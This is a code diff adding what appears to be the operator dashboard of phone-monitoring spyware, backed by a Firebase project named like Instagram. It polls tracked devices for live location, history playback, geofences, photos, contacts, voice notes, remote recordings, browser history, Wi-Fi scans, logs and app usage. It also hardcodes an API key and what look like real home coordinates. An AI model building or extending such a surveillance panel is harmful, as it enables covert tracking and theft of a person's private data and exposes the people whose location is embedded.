+<span style="font-size:16px;font-weight:500">&#x1F4AA; Health</span>
+<div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollHealth()">&#x1F504; Refresh</span>
+</div>
+</div>
+<div style="display:flex;gap:8px;flex-wrap:wrap">
+<div class="card" style="flex:1;min-width:200px;border-left-color:var(--accent)">
+<div class="label">&#x1F45F; Steps Today</div>
+<div style="font-size:30px;font-weight:700" id="healthSteps">--</div>
+<div style="font-size:14px;color:var(--muted)" id="healthStepsGoal">Goal: --</div>
+<div style="margin-top:6px;height:6px;background:var(--border);border-radius:3px;overflow:hidden">
+<div id="healthStepsBar" style="height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--success));border-radius:3px;transition:width 0.5s"></div>
+</div>
+</div>
+<div class="card" style="flex:1;min-width:200px;border-left-color:var(--info)">
+<div class="label">&#x1F3C3; Current Activity</div>
+<div style="font-size:24px;font-weight:700" id="healthActivity">--</div>
+<div style="font-size:14px;color:var(--muted)" id="healthActivityConfidence">--</div>
+</div>
+</div>
+<div style="margin-top:12px">
+<div class="label">&#x1F4C5; Step History (Last 7 Days)</div>
+<div id="healthStepChart" style="display:flex;gap:4px;align-items:flex-end;height:100px;padding:8px 4px;border:1px solid var(--border);border-radius:6px;margin-top:4px">
+<div class="label" style="width:100%;text-align:center;color:var(--muted)">Loading...</div>
+</div>
+</div>
+<div style="margin-top:12px">
+<div class="label">&#x1F3C3; Activity Timeline</div>
+<div id="healthActivityTimeline" style="max-height:200px;overflow-y:auto;margin-top:4px">
+<div class="label" style="color:var(--muted)">No activity data yet</div>
+</div>
+</div>
+</div>
+<div id="tab-playback">
+<div class="pb-stats" id="pbStats" style="display:none">
+<div class="card" style="border-left-color:var(--accent);padding:10px 14px">
+<div style="display:flex;gap:14px;flex-wrap:wrap;font-size:15px">
+<span><span style="color:var(--muted)">&#x1F4CC;</span> <strong id="stPoints">--</strong></span>
+<span><span style="color:var(--muted)">&#x23F1;</span> <strong id="stDuration">--</strong></span>
+<span><span style="color:var(--muted)">&#x1F4D0;</span> <strong id="stDistance">--</strong></span>
+<span style="color:var(--success)">&#x2B50; <strong id="stHighAcc">0</strong></span>
+</div>
+<div style="font-size:12px;color:var(--muted);margin-top:4px">
+<span id="stRange">--</span>
+</div>
+</div>
+</div>
+<div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin:10px 0 8px">
+<div class="pg" style="gap:4px">
+<select id="accuracyFilter" style="font-size:12px;padding:4px 16px 4px 6px;min-height:28px">
+<option value="0">Accuracy: All</option>
+<option value="10" selected>≤ 10 m</option>
+<option value="50">≤ 50 m</option>
+<option value="100">≤ 100 m</option>
+<option value="200">≤ 200 m</option>
+<option value="500">≤ 500 m</option>
+</select>
+</div>
+</div>
+<div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin:10px 0 8px">
+<div class="pg" style="gap:4px">
+<select id="periodUnit" style="font-size:12px;padding:4px 20px 4px 6px;min-height:28px">
+<option value="3600">Last hour</option>
+<option value="21600">Last 6 hrs</option>
+<option value="43200">Last 12 hrs</option>
+<option value="86400" selected>Last 24 hrs</option>
+<option value="259200">Last 3 days</option>
+<option value="604800">Last 7 days</option>
+<option value="2592000">Last 30 days</option>
+<option value="0">All time</option>
+</select>
+<button class="chip" id="loadHistoryBtn" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:12px">&#x1F4C5; Load</button>
+</div>
+</div>
+<div id="pbPointList" style="margin-top:6px"><div class="label">Load history to see points</div></div>
+</div>
+</div>
+</div>
+<div class="map-wrap" id="mapWrap">
+<div id="map"></div>
+    <div class="pb-bar" id="playbackBar" style="display:none">
+  <div class="pb-grp">
+    <button class="pb-btn" id="playBtn" title="Play/Pause">&#x25B6;</button>
+    <button class="pb-btn" id="rewindBtn" title="Reset">&#x23EE;</button>
+    <button class="pb-btn" id="dirBtn" title="Direction: Forward">&#x2192;</button>
+    <button class="pb-btn" id="loopBtn" title="Loop: Off">&#x21BA;</button>
+  </div>
+  <div class="pb-div"></div>
+  <div class="pb-grp">
+    <select id="speedSelect">
+      <option value="1">1x</option><option value="5">5x</option>
+      <option value="10" selected>10x</option><option value="50">50x</option>
+      <option value="120">120x</option><option value="600">600x</option>
+    </select>
+  </div>
+  <div class="pb-div"></div>
+  <div class="pb-grp pb-scrub">
+    <input type="range" id="playScrubber" min="0" max="100" value="0">
+    <div class="pb-slab">
+      <span id="playTsStart">--</span>
+      <span id="playTsEnd">--</span>
+    </div>
+  </div>
+  <div class="pb-div"></div>
+  <div class="pb-grp pb-info">
+    <span class="pb-cnt" id="playCount">0/0</span>
+    <span class="pb-meta" id="playMeta">--</span>
+  </div>
+</div>
+</div>
+</div>
+<div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""><div id="lightboxCaption" style="position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:30px 14px 10px;color:#eee;font-size:14px;text-align:center;pointer-events:none"></div></div>
+
+<script>
+// --- Firebase Config ---
+const RTDB = 'https://instgram-7148c-default-rtdb.europe-west1.firebasedatabase.app';
+const FIRESTORE = 'https://firestore.googleapis.com/v1/projects/instgram-7148c/databases/(default)/documents';
+const API_KEY = 'AIzaSyBzvqD0ZrFNYJnJEWQ2zJndIK9ZgqOSDm8';
+const PKT = 'Asia/Karachi';
+
+// --- State ---
+let devices = {};
+let selectedDevice = null;
+let locationHistory = [];
+let historyAutoLoaded = false;
+let marker, accuracyCircle, trail;
+let geofences = [];
+let alertedZones = new Set();
+let readBudget = (() => { try { return JSON.parse(localStorage.getItem('readBudget') || '{"count":0,"day":""}'); } catch { return { count: 0, day: '' }; } })();
+let cachedPhotos = {};
+let appsCache = null;
+let appsFullCache = null;
+let appsLastSync = 0;
+let appsPhoneSync = 0;
+let appSnapshotsCache = null;
+let appSnapshotsLastSync = 0;
+let cachedAddresses = (() => { try { return JSON.parse(localStorage.getItem('geoCache') || '{}'); } catch { return {}; } })();
+let nomQueue = [];
+let timelineCache = null;
+let contactsCache = null;
+let contactsSyncTs = 0;
+let nomProcessing = false;
+
+function loadGeofences(deviceId) {
+  if (!deviceId) { geofences = []; renderGeofences(); renderGeofenceList(); return; }
+  try { geofences = JSON.parse(localStorage.getItem('geofences_' + deviceId) || '[]'); } catch { geofences = []; }
+  if (!geofences.length) {
+    geofences.push({ id: 'home', name: 'Home', lat: 32.04551, lng: 73.43149, radius: 1000, active: true });
+    localStorage.setItem('geofences_' + deviceId, JSON.stringify(geofences));
+  }
+  alertedZones = new Set();
+  renderGeofences();
+  renderGeofenceList();
+}
+
+// --- Playback State ---
+let playbackRunning = false;
+let lastUpdateTime = 0;
+let playbackIdx = 0;
+let playbackTimer = null;
+let playbackPoints = [];
+let playbackDirection = 1;
+let playbackLoop = false;
+
+// --- Poll Timers ---
+let pollTimers = [];
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000 };
+let intervals = { ...BASE_INTERVALS };
+
+// --- Init Map ---
+const map = L.map('map').setView([33.6844, 73.0479], 13);
+
+const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a>',
+  maxZoom: 19
+});
+
+const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+  attribution: '&copy; Esri', maxZoom: 20
+});
+
+streetLayer.addTo(map);
+
+L.control.layers({
+  '🗺️ Street': streetLayer,
+  '🛰️ Satellite': satelliteLayer
+}, null, { position: 'topright' }).addTo(map);
+
+// --- Read Budget ---
+function trackRead(count = 1) {
+  const today = new Date().toISOString().slice(0,10);
+  if (readBudget.day !== today) { readBudget = { count: 0, day: today }; }
+  readBudget.count += count;
+  localStorage.setItem('readBudget', JSON.stringify(readBudget));
+  document.getElementById('readBudget').textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
+  if (readBudget.count > 40000) {
+    intervals.hist = 600000; intervals.meta = 120000;
+    intervals.photos = 600000; intervals.apps = 600000; intervals.voice = 600000; intervals.remote = 60000;
+    showAlert('Approaching Firebase read limit \u2014 reduced poll rate', 'warn');
+  } else {
+    intervals = { ...BASE_INTERVALS };
+  }
+}
+
+// --- Alert ---
+function showAlert(msg, type = 'warn') {
+  const el = document.getElementById('alertBanner');
+  el.textContent = msg; el.className = 'alert-banner show ' + type;
+  setTimeout(() => el.classList.remove('show'), 8000);
+}
+
+// --- Nominatim Geocode ---
+function geocode(lat, lng) {
+  const key = lat.toFixed(3) + ',' + lng.toFixed(3);
+  if (cachedAddresses[key]) return Promise.resolve(cachedAddresses[key]);
+  return new Promise(resolve => {
+    nomQueue.push({ lat, lng, key, resolve });
+    if (!nomProcessing) processNomQueue();
+  });
+}
+
+async function processNomQueue() {
+  nomProcessing = true;
+  while (nomQueue.length) {
+    const { lat, lng, key, resolve } = nomQueue.shift();
+    try {
+      const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`);
+      const d = await r.json();
+      cachedAddresses[key] = d;
+      localStorage.setItem('geoCache', JSON.stringify(cachedAddresses));
+      resolve(d);
+    } catch { resolve(null); }
+    await new Promise(r => setTimeout(r, 1100));
+  }
+  nomProcessing = false;
+}
+
+// --- Haversine ---
+function haversine(lat1, lng1, lat2, lng2) {
+  const R = 6371000;
+  const dLat = (lat2 - lat1) * Math.PI / 180;
+  const dLng = (lng2 - lng1) * Math.PI / 180;
+  const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLng/2)**2;
+  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+}
+
+// --- Douglas-Peucker (object-based) ---
+function simplify(points, tolerance = 300) {
+  if (points.length <= 2) return points;
+  let maxDist = 0, maxIdx = 0;
+  const first = points[0], last = points[points.length - 1];
+  for (let i = 1; i < points.length - 1; i++) {
+    const d = perpendicularDist(points[i], first, last);
+    if (d > maxDist) { maxDist = d; maxIdx = i; }
+  }
+  if (maxDist > tolerance) {
+    const left = simplify(points.slice(0, maxIdx + 1), tolerance);
+    const right = simplify(points.slice(maxIdx), tolerance);
+    return left.slice(0, -1).concat(right);
+  }
+  return [first, last];
+}
+
+function perpendicularDist(p, a, b) {
+  const dx = b.lng - a.lng, dy = b.lat - a.lat;
+  const num = Math.abs(dy * p.lng - dx * p.lat + b.lng * a.lat - b.lat * a.lng);
+  const den = Math.sqrt(dx*dx + dy*dy);
+  return den ? num / den : 0;
+}
+
+function escHtml(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+// --- PKT Format ---
+function pkt(ts) {
+  const d = new Date(ts);
+  return d.toLocaleString('en-PK', { timeZone: PKT, hour12: true,
+    year: 'numeric', month: '2-digit', day: '2-digit', hour: 'numeric', minute: '2-digit', second: '2-digit' });
+}
+function pktShort(ts) {
+  const d = new Date(ts);
+  return d.toLocaleString('en-PK', { timeZone: PKT, hour12: true, hour: 'numeric', minute: '2-digit', second: '2-digit' });
+}
+function pktTime(ts) {
+  const d = new Date(ts);
+  return d.toLocaleString('en-PK', { timeZone: PKT, hour12: true, month: 'short', day: '2-digit', hour: 'numeric', minute: '2-digit' });
+}
+
+function relativeTime(ts) {
+  const diff = Date.now() - ts;
+  if (diff < 60000) return 'just now';
+  if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
+  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
+  if (diff < 172800000) return 'yesterday';
+  if (diff < 604800000) return Math.floor(diff / 86400000) + 'd ago';
+  return pktTime(ts);
+}
+
+// --- Geofences ---
+function saveGeofences() {
+  if (!selectedDevice) return;
+  localStorage.setItem('geofences_' + selectedDevice, JSON.stringify(geofences));
+  renderGeofenceList();
+}
+
+function addGeofence(lat, lng) {
+  const name = prompt('Geofence name:');
+  if (!name) return;
+  geofences.push({ id: Date.now().toString(), name, lat, lng, radius: 100, active: true });
+  saveGeofences();
+  renderGeofences();
+}
+
+function renderGeofences() {
+  map.eachLayer(l => { if (l._isGeofence) map.removeLayer(l); });
+  geofences.filter(g => g.active).forEach(g => {
+    L.circle([g.lat, g.lng], { radius: g.radius, color: '#ffca28', fillOpacity: 0.1, dashArray: '5,10' })
+      ._isGeofence = true;
+  });
+}
+
+function sendNotification(title, body) {
+  if (typeof Notification === 'undefined') return;
+  if (Notification.permission === 'granted') {
+    try { new Notification(title, { body }); } catch {}
+  }
+}
+
+function checkGeofences(lat, lng) {
+  geofences.filter(g => g.active).forEach(g => {
+    const dist = haversine(lat, lng, g.lat, g.lng);
+    const inside = dist <= g.radius;
+    if (inside && !alertedZones.has(g.id)) {
+      sendNotification('Geofence: ' + g.name, 'Device entered ' + g.name);
+      alertedZones.add(g.id);
+    } else if (!inside) alertedZones.delete(g.id);
+  });
+}
+
+function renderGeofenceList() {
+  const el = document.getElementById('geofenceList');
+  if (!geofences.length) { el.innerHTML = '<div class="label">Right-click map to add geofence</div>'; return; }
+  el.innerHTML = geofences.map(g => `
+    <div class="card" style="border-left-color:${g.active?'var(--accent)':'var(--border)'}">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <span>${g.name}</span>
+        <span style="font-size:13px;color:var(--muted)">${g.lat.toFixed(4)}, ${g.lng.toFixed(4)}</span>
+      </div>
+      <div style="display:flex;gap:10px;margin-top:6px;font-size:14px">
+        <label>Radius: <input type="range" min="20" max="500" value="${g.radius}" data-gf="${g.id}" class="gf-radius" style="width:80px;accent-color:var(--accent)"> ${g.radius}m</label>
+        <button class="chip" data-gf="${g.id}" data-action="toggle">${g.active?'On':'Off'}</button>
+        <button class="chip" data-gf="${g.id}" data-action="delete" style="border-color:var(--danger)">Delete</button>
+      </div>
+    </div>`).join('');
+}
+
+document.addEventListener('click', e => {
+  const btn = e.target.closest('[data-action]');
+  if (!btn) return;
+  const id = btn.dataset.gf;
+  const gf = geofences.find(g => g.id === id);
+  if (!gf) return;
+  if (btn.dataset.action === 'toggle') { gf.active = !gf.active; saveGeofences(); renderGeofences(); }
+  if (btn.dataset.action === 'delete') { geofences = geofences.filter(g => g.id !== id); saveGeofences(); renderGeofences(); }
+});
+
+document.addEventListener('input', e => {
+  if (e.target.classList.contains('gf-radius')) {
+    const id = e.target.dataset.gf;
+    const gf = geofences.find(g => g.id === id);
+    if (gf) { gf.radius = parseInt(e.target.value); saveGeofences(); renderGeofences(); }
+  }
+});
+
+map.on('contextmenu', e => addGeofence(e.latlng.lat, e.latlng.lng));
+
+// --- Home Location (RTDB config) ---
+async function pollHomeConfig() {
+  if (!selectedDevice) return;
+  try {
+    const home = await fetchRTDB(`devices/${selectedDevice}/config/home`);
+    const el = document.getElementById('homeInfo');
+    if (home && home.lat) {
+      el.innerHTML = `<span style="color:var(--success)">&#x1F3E0;</span> ${home.lat.toFixed(6)}, ${home.lng.toFixed(6)}${home.label ? ' <span style="color:var(--muted)">(' + escHtml(home.label) + ')</span>' : ''}`;
+    } else {
+      el.innerHTML = '<span style="color:var(--muted)">No home set — night learning active</span>';
+    }
+  } catch { document.getElementById('homeInfo').innerHTML = '<span style="color:var(--danger)">Failed to load</span>'; }
+}
+document.getElementById('setHomeBtn').addEventListener('click', async () => {
+  if (!selectedDevice) return;
+  const loc = await fetchRTDB(`devices/${selectedDevice}/location/latest`);
+  if (!loc || !loc.lat) { showAlert('No location data for this device', 'error'); return; }
+  const homeData = { lat: loc.lat, lng: loc.lng, accuracy: loc.accuracy || 0, setAt: Date.now(), label: 'Set from dashboard' };
+  try {
+    await fetch(`${RTDB}/devices/${selectedDevice}/config/home.json`, { method: 'PUT', body: JSON.stringify(homeData) });
+    showAlert('Home location set for this device', 'warn');
+    pollHomeConfig();
+  } catch { showAlert('Failed to set home', 'error'); }
+});
+document.getElementById('removeHomeBtn').addEventListener('click', async () => {
+  if (!selectedDevice) return;
+  try {
+    await fetch(`${RTDB}/devices/${selectedDevice}/config/home.json`, { method: 'DELETE' });
+    showAlert('Home location removed — night learning will resume', 'warn');
+    pollHomeConfig();
+  } catch { showAlert('Failed to remove home', 'error'); }
+});
+
+// --- Tabs ---
+const MAP_TABS = new Set(['live', 'playback']);
+function toggleMap(show) {
+  document.getElementById('mapWrap').classList.toggle('map-hide', !show);
+  document.body.style.gridTemplateColumns = show ? '' : '1fr';
+}
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.content > div').forEach(d => d.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+    toggleMap(MAP_TABS.has(btn.dataset.tab));
+    if (btn.dataset.tab === 'playback') {
+      if (!historyAutoLoaded && !locationHistory.length) {
+        historyAutoLoaded = true;
+        loadDefaultHistory();
+      }
+      renderPlaybackTab();
+    }
+    if (btn.dataset.tab === 'insights') renderInsights();
+    if (btn.dataset.tab === 'storage') refreshStorage();
+    if (btn.dataset.tab === 'browser') pollBrowserHistory();
+    if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
+    if (btn.dataset.tab === 'photos') pollPhotos();
+    if (btn.dataset.tab === 'wifi') pollWifiScans();
+    if (btn.dataset.tab === 'logcat') pollLogcat();
+    if (btn.dataset.tab === 'health') pollHealth();
+  });
+});
+
+// --- Tab-aware polling ---
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) { stopPolling(); }
+  else { startPolling(); pollAll(); }
+});
+
+// --- Device Select ---
+document.getElementById('deviceSelect').addEventListener('change', function() {
+  selectedDevice = this.value;
+  localStorage.setItem('selectedDevice', selectedDevice);
+  locationHistory = [];
+  historyAutoLoaded = false;
+  cachedPhotos = {};
+  photoKeys = [];
+  photoOffset = 0;
+  playbackPoints = [];
+  timelineCache = null;
+  appsCache = null;
+  appsFullCache = null;
+  appsLastSync = 0;
+  appsPhoneSync = 0;
+  appSnapshotsCache = null;
+  appSnapshotsLastSync = 0;
+  contactsCache = null;
+  contactsSyncTs = 0;
+  wifiCache = [];
+  logcatCache = [];
+  window.permCache = null;
+  window.permLastSync = 0;
+  if (trail) { map.removeLayer(trail); trail = null; }
+  loadGeofences(selectedDevice);
+  // Clear meta UI immediately to prevent stale data from previous device
+  document.getElementById('batVal').textContent = '--';
+  document.getElementById('wifiVal').textContent = '--';
+  document.getElementById('devVal').textContent = '--';
+  document.getElementById('lastScreenOnVal').textContent = '--';
+  document.getElementById('activeAppVal').textContent = '--';
+  document.getElementById('updatedVal').textContent = '--';
+  document.getElementById('fcmTokenInfo').textContent = '';
+  document.getElementById('queueBadge').textContent = '';
+  const countEl = document.getElementById('offlineQueueCount');
+  if (countEl) { countEl.textContent = '0'; countEl.style.color = 'var(--muted)'; }
+  pollAll();
+});
+
+// --- Polling ---
+function stopPolling() {
+  pollTimers.forEach(t => clearTimeout(t)); pollTimers = [];
+}
+
+function startPolling() {
+  stopPolling();
+  pollLocation();
+  schedulePoll('meta', intervals.meta, pollMeta);
+  schedulePoll('apps', intervals.apps, pollApps);
+  schedulePoll('appSnapshots', 30000, pollAppSnapshots);
+  schedulePoll('hist', intervals.hist, pollHistory);
+  schedulePoll('voice', intervals.voice, pollVoiceNotes);
+  schedulePoll('remote', intervals.remote, pollRemoteRecordings);
+  schedulePoll('contacts', intervals.contacts, pollContacts);
+  schedulePoll('perms', intervals.perms, pollPermissions);
+  schedulePoll('fcm', intervals.fcm, pollFcmToken);
+  schedulePoll('queue', 30000, pollQueueSize);
+  schedulePoll('browser', 120000, pollBrowserHistory);
+  schedulePoll('insights', 120000, renderInsights);
+  schedulePoll('wifi', 60000, pollWifiScans);
+  schedulePoll('logcat', 60000, pollLogcat);
+  schedulePoll('health', 60000, pollHealth);
+}
+
+function schedulePoll(name, interval, fn) {
+  async function run() {
+    try { await fn(); } catch {}
+    if (!document.hidden) pollTimers.push(setTimeout(run, interval));
+  }
+  pollTimers.push(setTimeout(run, interval));
+}
+
+async function pollAll() {
+  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth()];
+  for (const fn of fns) { try { await fn; } catch {} }
+}
+
+// --- Firebase helpers ---
+async function fetchRTDB(path, query) {
+  trackRead();
+  try {
+    const qs = query ? `?${query}` : '';
+    const r = await fetch(`${RTDB}/${path}.json${qs}`);
+    if (!r.ok) return null;
+    return r.json();
+  } catch { return null; }
+}
+
+async function fetchFirestore(path) {
+  trackRead();
+  try {
+    const r = await fetch(`${FIRESTORE}/${path}?key=${API_KEY}`);
+    if (!r.ok) return null;
+    return r.json();
+  } catch { return null; }
+}
+
+function fromFirestoreFields(fields) {
+  if (!fields || typeof fields !== 'object') return fields;
+  const result = {};
+  for (const [key, val] of Object.entries(fields)) {
+    if (val.stringValue !== undefined) result[key] = val.stringValue;
+    else if (val.integerValue !== undefined) result[key] = parseInt(val.integerValue, 10);
+    else if (val.doubleValue !== undefined) result[key] = val.doubleValue;
+    else if (val.booleanValue !== undefined) result[key] = val.booleanValue;
+    else if (val.arrayValue !== undefined) result[key] = (val.arrayValue.values || []).map(v => fromFirestoreFields(v));
+    else if (val.mapValue !== undefined) result[key] = fromFirestoreFields(val.mapValue.fields);
+    else result[key] = val;
+  }
+  return result;
+}
+
+async function fetchDevices() {
+  const keys = await fetchRTDB('devices', 'shallow=true');
+  if (!keys || typeof keys !== 'object') {
+    document.getElementById('statusDot').textContent = '\u2716 No data';
+    document.getElementById('statusDot').className = 'status warn';
+    return;
+  }
+  devices = {};
+  const sel = document.getElementById('deviceSelect');
+  const ids = Object.keys(keys);
+  if (!ids.length) {
+    document.getElementById('statusDot').textContent = '\u2716 No devices';
+    document.getElementById('statusDot').className = 'status warn';
+    return;
+  }
+  const active = [];
+  for (const id of ids) {
+    const ts = await fetchRTDB(`devices/${id}/metrics/latest/timestamp`);
+    if (ts) active.push({ id, ts: Date.parse(ts) || 0 });
+  }
+  active.sort((a, b) => b.ts - a.ts);
+  if (!active.length) {
+    document.getElementById('statusDot').textContent = '\u2716 No active devices';
+    document.getElementById('statusDot').className = 'status warn';
+    return;
+  }
+
+  // Fetch manufacturer+model for each device, then deduplicate
+  const modelMap = {};
+  for (const entry of active) {
+    const info = await fetchRTDB(`devices/${entry.id}/info`);
+    const metrics = info ? null : await fetchRTDB(`devices/${entry.id}/metrics/latest`);
+    const devInfo = info || metrics || {};
+    const manuf = (devInfo.manufacturer || '').trim();
+    const model = (devInfo.deviceModel || '').trim();
+    const modelKey = manuf && model ? manuf + '|' + model : entry.id;
+    if (!modelMap[modelKey] || entry.ts > modelMap[modelKey].ts) {
+      modelMap[modelKey] = { id: entry.id, ts: entry.ts, manuf, model, label: [manuf, model].filter(Boolean).join(' ') || entry.id.slice(0, 8) };
+    }
+  }
+  const dedupedIds = Object.values(modelMap).sort((a, b) => b.ts - a.ts);
+  const activeIds = dedupedIds.map(a => a.id);
+
+  selectedDevice = activeIds[0];
+  loadGeofences(selectedDevice);
+  localStorage.setItem('selectedDevice', selectedDevice);
+  dedupedIds.forEach(d => { devices[d.id] = { id: d.id, label: d.label, model: d.model, manuf: d.manuf }; });
+  sel.innerHTML = dedupedIds.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
+  sel.value = selectedDevice;
+}
+
+async function pollLocation() {
+  if (!selectedDevice) return;
+  const loc = await fetchRTDB(`devices/${selectedDevice}/location/latest`);
+  if (!loc || !loc.lat) { if (!document.hidden) pollTimers.push(setTimeout(pollLocation, intervals.loc)); return; }
+  updateLocationUI(loc);
+  updateMap(loc);
+  checkGeofences(loc.lat, loc.lng);
+  const HOME_COORDS = [
+    { lat: 32.04551, lng: 73.43148 },
+    { lat: 32.05568, lng: 73.55240 }
+  ];
+  const atHome = HOME_COORDS.some(h => haversine(loc.lat, loc.lng, h.lat, h.lng) <= 1000);
+  const insideGeo = geofences.some(g => g.active && haversine(loc.lat, loc.lng, g.lat, g.lng) <= g.radius);
+  const parked = atHome || insideGeo;
+  document.getElementById('statusDot').textContent = parked ? '\u25CF Parked' : '\u25CF Live';
+  if (!document.hidden) pollTimers.push(setTimeout(pollLocation, parked ? 300000 : intervals.loc));
+}
+
+async function pollMeta() {
+  if (!selectedDevice) return;
+  const m = await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
+  if (!m) {
+    document.getElementById('batVal').textContent = '--';
+    document.getElementById('wifiVal').textContent = '--';
+    document.getElementById('devVal').textContent = '--';
+    document.getElementById('lastScreenOnVal').textContent = '--';
+    document.getElementById('activeAppVal').textContent = '--';
+    document.getElementById('updatedVal').textContent = '--';
+    return;
+  }
+  document.getElementById('batVal').textContent = (m.batteryPct || '--') + '%' + (m.isCharging ? ' \u26A1' : '');
+  document.getElementById('wifiVal').textContent = m.wifiSsid || '--';
+  document.getElementById('devVal').textContent = m.deviceModel || '--';
+  document.getElementById('liveStepsVal').textContent = m.stepsToday ? m.stepsToday.toLocaleString() : '--';
+  document.getElementById('liveCarrierVal').textContent = m.networkOperatorName || m.networkOperator || '--';
+  document.getElementById('liveNetworkVal').textContent = m.networkTypeDetail || '--';
+  document.getElementById('liveSimVal').textContent = m.simCountryIso ? m.simCountryIso.toUpperCase() : '--';
+  if (m.deviceModel && devices[selectedDevice]) {
+    const label = [m.manufacturer, m.deviceModel].filter(Boolean).join(' ');
+    devices[selectedDevice].label = label;
+    const opt = document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`);
+    if (opt) opt.textContent = label;
+  }
+  // Active app & screen state
+  const lastScreen = parseInt(m.lastScreenOnMs || '0');
+  document.getElementById('lastScreenOnVal').textContent = lastScreen ? pkt(lastScreen) : '--';
+  (async () => {
+    try {
+      const aa = await fetchRTDB(`devices/${selectedDevice}/activeApp`);
+      if (aa && aa.appName) {
+        const since = aa.lastUsedMs ? ' \u00B7 ' + pkt(aa.lastUsedMs) : '';
+        document.getElementById('activeAppVal').textContent = aa.appName + since;
+      }
+    } catch {}
+  })();
+  const ts = parseInt(m.ts_ms || '0');
+  if (ts > lastUpdateTime) {
+    lastUpdateTime = ts;
+    document.getElementById('updatedVal').textContent = pkt(ts) + ' (phone)';
+    document.getElementById('statusDot').textContent = '\u25CF Live';
+    document.getElementById('statusDot').className = 'status';
+  }
+}
+
+// --- Photos (Lazy Load) ---
+let photoKeys = [];
+let photoOffset = 0;
+const PHOTO_BATCH = 24;
+let photoLoading = false;
+
+function dateBucket(ts) {
+  if (!ts) return 'Older';
+  const now = new Date();
+  const d = new Date(ts);
+  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+  const yesterday = new Date(today - 86400000);
+  const weekAgo = new Date(today - 6 * 86400000);
+  const monthAgo = new Date(today - 29 * 86400000);
+  if (d >= today) return 'Today';
+  if (d >= yesterday) return 'Yesterday';
+  if (d >= weekAgo) return 'This Week';
+  if (d >= monthAgo) return 'This Month';
+  return 'Older';
+}
+
+function renderPhotosFromCache() {
+  const grid = document.getElementById('photoGrid');
+  const countEl = document.getElementById('photoCount');
+  const lmContainer = document.getElementById('loadMoreContainer');
+  if (!grid) return;
+  if (!Object.keys(cachedPhotos).length) {
+    const total = photoKeys.length;
+    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F4F8; ' + (total ? 'Loaded ' + photoOffset + '/' + total + ' &mdash; click Load More below' : 'No photos yet') + '</div>';
+    if (countEl) countEl.innerHTML = total ? '&middot; ' + total + ' total' : '';
+    if (lmContainer) lmContainer.innerHTML = '';
+    return;
+  }
+
+  // Dedup by (fileName, dateTaken) keeping highest quality
+  const dedup = {};
+  for (const doc of Object.values(cachedPhotos)) {
+    if (!doc || !doc.data) continue;
+    const key = (doc.fileName || '') + '|' + (doc.dateTaken || '');
+    const existing = dedup[key];
+    if (!existing || (doc.data.length > existing.data.length)) dedup[key] = doc;
+  }
+
+  const totalStr = photoKeys.length ? ' &middot; ' + photoKeys.length + ' total' : '';
+  if (countEl) countEl.innerHTML = '&middot; ' + Object.keys(dedup).length + ' loaded' + totalStr;
+
+  // Group by date bucket
+  const groups = {};
+  for (const doc of Object.values(dedup)) {
+    const ts = doc.dateTaken || doc.timestamp || 0;
+    const bucket = dateBucket(ts);
+    if (!groups[bucket]) groups[bucket] = [];
+    groups[bucket].push(doc);
+  }
+
+  let html = '';
+  const bucketOrder = ['Today', 'Yesterday', 'This Week', 'This Month', 'Older'];
+  for (const b of bucketOrder) {
+    if (!groups[b] || !groups[b].length) continue;
+    groups[b].sort((a, b) => ((b.dateTaken || 0) - (a.dateTaken || 0)));
+    html += '<div class="photo-day">';
+    html += '<div class="photo-day-header"><span>' + b + '</span><span class="photo-day-count">' + groups[b].length + ' photos</span></div>';
+    html += '<div class="photo-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:5px">';
+    for (const doc of groups[b]) {
+      const ts = doc.timestamp || 0;
+      const dateTaken = doc.dateTaken ? pkt(doc.dateTaken) : '';
+      const fileName = doc.fileName || '';
+      const synced = pkt(ts);
+      html += '<div class="pwrap" data-ts="' + ts + '" onclick="openPhotoLightbox(this)">' +
+        '<img src="data:image/jpeg;base64,' + doc.data + '" loading="lazy" decoding="async">' +
+        '<div class="pcap"><div>' + escHtml(fileName || dateTaken || synced) + '</div>' +
+        '<div class="ptime">' + (dateTaken ? dateTaken + ' &middot; ' : '') + synced + '</div></div></div>';
